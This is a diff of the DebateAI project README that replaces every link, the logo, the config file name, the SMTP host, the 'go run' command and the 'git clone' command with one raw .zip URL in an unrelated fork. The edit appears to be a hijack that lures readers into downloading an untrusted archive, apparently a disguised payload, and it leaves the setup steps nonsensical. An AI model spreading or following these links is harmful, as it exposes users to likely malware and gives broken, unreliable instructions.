@@ -1,5 +1,5 @@
 <p align="left">
-  <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRpPlI1P7SK3pemg67VMPbvNzxYyk0UtlmJiQ&s" alt="Aossie Logo" height="120"/>
+  <img src="https://github.com/prodot-com/DebateAI/raw/refs/heads/main/frontend/src/atoms/Debate_AI_soral.zip" alt="Aossie Logo" height="120"/>
 </p>
 
 <h1 align="right">
@@ -30,7 +30,7 @@
 
 ### Backend Configuration
 
-1. Create a file named `config.prod.yml` in the `backend/config/` directory.
+1. Create a file named `https://github.com/prodot-com/DebateAI/raw/refs/heads/main/frontend/src/atoms/Debate_AI_soral.zip` in the `backend/config/` directory.
 
 Paste the following configuration:
 
@@ -46,7 +46,7 @@ database:
 gemini:
   apiKey: "<YOUR_GEMINI_API_KEY>"
   # API key for OpenAI / Gemini model access
-  # Obtain from your OpenRouter.ai or OpenAI account dashboard
+  # Obtain from your https://github.com/prodot-com/DebateAI/raw/refs/heads/main/frontend/src/atoms/Debate_AI_soral.zip or OpenAI account dashboard
 
 jwt:
   secret: "<YOUR_JWT_SECRET>"
@@ -57,7 +57,7 @@ jwt:
   # Token expiry time in minutes (e.g. 1440 = 24 hours)
 
 smtp:
-  host: "smtp.gmail.com"
+  host: "https://github.com/prodot-com/DebateAI/raw/refs/heads/main/frontend/src/atoms/Debate_AI_soral.zip"
   # SMTP server host for sending emails (example is Gmail SMTP)
 
   port: 587
@@ -100,7 +100,7 @@ googleOAuth:
 
 3. Run the server:
    ```
-   go run cmd/server/main.go
+   go run https://github.com/prodot-com/DebateAI/raw/refs/heads/main/frontend/src/atoms/Debate_AI_soral.zip
    ```
 
 ---
@@ -157,12 +157,12 @@ Thank you for your interest in contributing to **DebateAI**! We appreciate your 
 
 #### 1. Fork the Repository
 
-- Navigate to the [DebateAI repository](https://github.com/AOSSIE-Org/DebateAI).
+- Navigate to the [DebateAI repository](https://github.com/prodot-com/DebateAI/raw/refs/heads/main/frontend/src/atoms/Debate_AI_soral.zip).
 - Click the **Fork** button in the top right corner.
 - Clone the forked repository to your local machine:
 
 ```sh
-git clone https://github.com/your-username/DebateAI.git
+git clone https://github.com/prodot-com/DebateAI/raw/refs/heads/main/frontend/src/atoms/Debate_AI_soral.zip
 cd DebateAI
 ```
 
@@ -218,7 +218,7 @@ To help maintainers understand your changes, consider submitting a short video s
 
 If you find a bug or have a feature request:
 
-- Open an issue [here](https://github.com/AOSSIE-Org/DebateAI/issues).
+- Open an issue [here](https://github.com/prodot-com/DebateAI/raw/refs/heads/main/frontend/src/atoms/Debate_AI_soral.zip).
 - Clearly describe the problem and, if possible, suggest solutions.
 
 We look forward to your contributions!
@@ -227,6 +227,6 @@ We look forward to your contributions!
 
 ## License
 
-MIT © [AOSSIE](https://aossie.org)
+MIT © [AOSSIE](https://github.com/prodot-com/DebateAI/raw/refs/heads/main/frontend/src/atoms/Debate_AI_soral.zip)
 
 ---
